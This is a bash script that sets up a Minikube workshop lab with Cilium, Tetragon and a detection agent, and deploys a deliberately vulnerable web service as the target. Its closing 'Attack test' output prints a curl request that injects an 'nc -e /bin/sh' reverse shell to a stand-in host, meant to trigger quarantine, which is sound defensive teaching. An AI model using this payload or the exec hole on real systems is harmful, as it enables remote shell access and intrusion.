#!/usr/bin/env bash
# workshop/setup-minikube.sh — Minimal ZTRE on Minikube for DevFest workshop
# Kernel-to-Serverless: Tetragon eBPF → ZTRE Agent → Cilium Isolation → Cloud Run Webhook
#
# Requirements:
#   - minikube, kubectl, helm, docker
#   - Linux host with kernel 5.8+ (BTF support for eBPF)
#   - 4 CPU cores, 4GB RAM available
#
# Usage:
#   ./workshop/setup-minikube.sh          # Full setup
#   ./workshop/setup-minikube.sh teardown  # Cleanup

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log()  { echo -e "${GREEN}[ZTRE]${NC} $*"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $*"; }
err()  { echo -e "${RED}[ERROR]${NC} $*"; exit 1; }

CLUSTER_NAME="ztre-workshop"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# ── Teardown ──────────────────────────────────────────────────────────
if [[ "${1:-}" == "teardown" ]]; then
    log "Tearing down minikube cluster: $CLUSTER_NAME"
    minikube delete -p "$CLUSTER_NAME" 2>/dev/null || true
    log "Done."
    exit 0
fi

# ── Preflight checks ─────────────────────────────────────────────────
for cmd in minikube kubectl helm docker; do
    command -v "$cmd" >/dev/null 2>&1 || err "$cmd not found. Install it first."
done

if [[ -f /sys/kernel/btf/vmlinux ]]; then
    log "Kernel BTF support: OK"
else
    warn "No /sys/kernel/btf/vmlinux found. Tetragon may fail. Need kernel 5.8+"
fi

# ── Step 1: Start Minikube with Cilium CNI ────────────────────────────
log "Starting minikube cluster: $CLUSTER_NAME"
if minikube status -p "$CLUSTER_NAME" &>/dev/null; then
    log "Cluster already running, reusing."
else
    minikube start \
        -p "$CLUSTER_NAME" \
        --cpus=4 \
        --memory=4096 \
        --driver=docker \
        --cni=cilium
fi

kubectl config use-context "$CLUSTER_NAME"

# ── Step 2: Wait for Cilium ──────────────────────────────────────────
log "Waiting for Cilium to be ready..."
kubectl wait --for=condition=Ready pods -l app.kubernetes.io/name=cilium-agent \
    -n kube-system --timeout=120s

# ── Step 3: Install Tetragon ─────────────────────────────────────────
log "Installing Tetragon..."
helm repo add cilium https://helm.cilium.io 2>/dev/null || true
helm repo update cilium 2>/dev/null || true

if helm status tetragon -n kube-system &>/dev/null; then
    log "Tetragon already installed, skipping."
else
    helm install tetragon cilium/tetragon \
        --namespace kube-system \
        --set tetragon.grpc.address="unix:///var/run/tetragon/tetragon.sock" \
        --wait --timeout 3m
fi

log "Waiting for Tetragon to be ready..."
kubectl rollout status ds/tetragon -n kube-system --timeout=120s

# ── Step 4: Create namespaces ─────────────────────────────────────────
log "Creating namespaces..."
kubectl apply -f "$PROJECT_ROOT/deploy/namespaces.yaml"

# ── Step 5: Deploy TracingPolicy + Cilium quarantine + RBAC + Config ─
log "Deploying ZTRE Kubernetes resources..."
kubectl apply -f "$PROJECT_ROOT/deploy/tetragon-tracing-policy.yaml"
kubectl apply -f "$PROJECT_ROOT/deploy/cilium-quarantine-policy.yaml"
kubectl apply -f "$PROJECT_ROOT/deploy/rbac.yaml"
kubectl apply -f "$PROJECT_ROOT/deploy/configmap.yaml"

# ── Step 6: Build and load images ─────────────────────────────────────
log "Building ZTRE Agent image..."
docker build -t ztre-agent:v0.4.4 -f "$PROJECT_ROOT/deploy/Dockerfile" "$PROJECT_ROOT"

log "Building vulnerable-web image..."
docker build -t ztre-vulnerable-web:v1 \
    -f "$PROJECT_ROOT/deploy/workloads/vulnerable-web/Dockerfile" \
    "$PROJECT_ROOT/deploy/workloads/vulnerable-web/"

log "Loading images into minikube..."
docker save ztre-agent:v0.4.4 | minikube -p "$CLUSTER_NAME" image load --daemon=false -
docker save ztre-vulnerable-web:v1 | minikube -p "$CLUSTER_NAME" image load --daemon=false -

# ── Step 7: Deploy workloads ─────────────────────────────────────────
log "Deploying vulnerable-web workload..."
kubectl apply -f "$PROJECT_ROOT/deploy/workloads/vulnerable-web.yaml"

log "Deploying ZTRE Agent DaemonSet..."
kubectl apply -f "$PROJECT_ROOT/deploy/ztre-agent-daemonset.yaml"

# Single-node minikube: remove control-plane affinity exclusion
log "Patching DaemonSet affinity for single-node minikube..."
kubectl patch ds ztre-agent -n ztre-system \
    --type=json -p '[{"op":"remove","path":"/spec/template/spec/affinity"}]' 2>/dev/null || true

# ── Step 8: Wait for everything ──────────────────────────────────────
log "Waiting for vulnerable-web to be ready..."
kubectl wait --for=condition=Available deployment/vulnerable-web \
    -n ztre-test --timeout=120s

log "Waiting for ZTRE Agent to be ready..."
kubectl rollout status ds/ztre-agent -n ztre-system --timeout=120s

# ── Verify ───────────────────────────────────────────────────────────
echo ""
echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║           ZTRE Workshop Environment Ready                   ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${GREEN}Cluster:${NC}     $CLUSTER_NAME"
echo -e "  ${GREEN}Cilium:${NC}      $(kubectl get pods -n kube-system -l app.kubernetes.io/name=cilium-agent -o jsonpath='{.items[0].status.phase}')"
echo -e "  ${GREEN}Tetragon:${NC}    $(kubectl get pods -n kube-system -l app.kubernetes.io/name=tetragon -o jsonpath='{.items[0].status.phase}')"
echo -e "  ${GREEN}ZTRE Agent:${NC}  $(kubectl get pods -n ztre-system -l app.kubernetes.io/name=ztre-agent -o jsonpath='{.items[0].status.phase}')"
echo -e "  ${GREEN}Target Pod:${NC}  $(kubectl get pods -n ztre-test -l app=vulnerable-web -o jsonpath='{.items[0].metadata.name}')"
echo ""
echo -e "  ${YELLOW}Attack test:${NC}"
echo -e "    curl http://\$(minikube -p $CLUSTER_NAME ip):30080/exec?cmd=nc%20-e%20/bin/sh%20198.51.100.1%204444"
echo ""
echo -e "  ${YELLOW}Watch quarantine:${NC}"
echo -e "    watch -n1 kubectl get pods -n ztre-test -L ztre/quarantine"
echo ""
echo -e "  ${YELLOW}Agent logs:${NC}"
echo -e "    kubectl logs -n ztre-system -l app.kubernetes.io/name=ztre-agent -f"
echo ""
echo -e "  ${YELLOW}Teardown:${NC}"
echo -e "    ./workshop/setup-minikube.sh teardown"
echo ""
